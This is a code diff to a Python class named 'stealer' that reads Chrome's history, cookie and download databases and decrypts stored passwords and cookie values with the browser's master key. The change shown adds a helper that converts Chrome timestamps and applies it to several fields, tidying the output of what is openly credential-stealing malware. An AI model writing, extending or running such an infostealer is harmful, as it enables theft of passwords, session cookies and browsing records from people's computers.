@@ -1,6 +1,7 @@
 import os
 import sqlite3
 import shutil
+import datetime
 from typing import Dict, List
 from Crypto.Cipher import AES
 
@@ -8,6 +9,13 @@ from Crypto.Cipher import AES
 class stealer:
     def __init__(self):
         pass
+
+    # Convert Webkit/Chrome timestamp to human-readable format
+    def convertWebkitChromeTimestamp(self, timestamp: int) -> str:
+        try:
+            return str(datetime.datetime(1601, 1, 1) + datetime.timedelta(microseconds=timestamp))
+        except Exception as e:
+            raise Exception(f"Error while converting the timestamp: {e}")
 
     # Decrypt the password using the master key
     def decryptPassword(self, buffer: bytes, masterKey: bytes) -> str:
@@ -66,7 +74,7 @@ class stealer:
             title: str              = row[1]
             visitCount: int         = row[2]
             typedCount: int         = row[3]
-            lastVisitTime: int      = row[4]
+            lastVisitTime: str      = self.convertWebkitChromeTimestamp(row[4])
             # print(f"[+]  - URL: {url}, Title: {title}, Visit Count: {visitCount}, Typed Count: {typedCount}, Last Visit Time: {lastVisitTime}")
             History[url] = {
                 "title": title,
@@ -98,19 +106,19 @@ class stealer:
         Cookie: Dict = {}
         for row in data:
             hostKey: str            = row[0]
-            creationUTC: int        = row[1]
+            creationUTC: str        = self.convertWebkitChromeTimestamp(row[1])
             name: str               = row[2]
             encryptedValue: bytes   = row[3]
             path: str               = row[4]
-            expiresUTC: int         = row[5]
+            expiresUTC: str         = self.convertWebkitChromeTimestamp(row[5])
             isSecure: int           = row[6]
             isHttpOnly: int         = row[7]
-            lastAccessUTC: int      = row[8]
+            lastAccessUTC: str      = self.convertWebkitChromeTimestamp(row[8])
             hasExpires: int         = row[9]
             isPersistent: int       = row[10]
             sameSite: int           = row[11]
             sourceScheme: int       = row[12]
-            decryptedValue: str = self.decryptPassword(encryptedValue, masterKey)
+            decryptedValue: str     = self.decryptPassword(encryptedValue, masterKey)
             # print(f"[+]  - Host Key: {hostKey}, Creation UTC: {creationUTC}, Name: {name}, Decrypted Value: {decryptedValue}, Path: {path}, Expires UTC: {expiresUTC}, Is Secure: {isSecure}, Is Http Only: {isHttpOnly}, Last Access UTC: {lastAccessUTC}, Has Expires: {hasExpires}, Is Persistent: {isPersistent}, Same Site: {sameSite}, Source Scheme: {sourceScheme}")
             Cookie[hostKey] = {
                 "creationUTC": creationUTC,
@@ -138,10 +146,10 @@ class stealer:
             currentPath: str        = row[0]
             targetPath: str         = row[1]
             referrer: str           = row[2]
-            startTime: int          = row[3]
-            endTime: int            = row[4]
+            startTime: str          = self.convertWebkitChromeTimestamp(row[3])
+            endTime: str            = self.convertWebkitChromeTimestamp(row[4])
             totalBytes: int         = row[5]
-            lastAccessTime: int     = row[6]
+            lastAccessTime: str     = self.convertWebkitChromeTimestamp(row[6])
             mimeType: str           = row[7]
             state: int              = row[8]
             dangerType: int         = row[9]
@@ -160,3 +168,4 @@ class stealer:
                 "interruptReason": interruptReason
             }
         return DownloadHistory
+
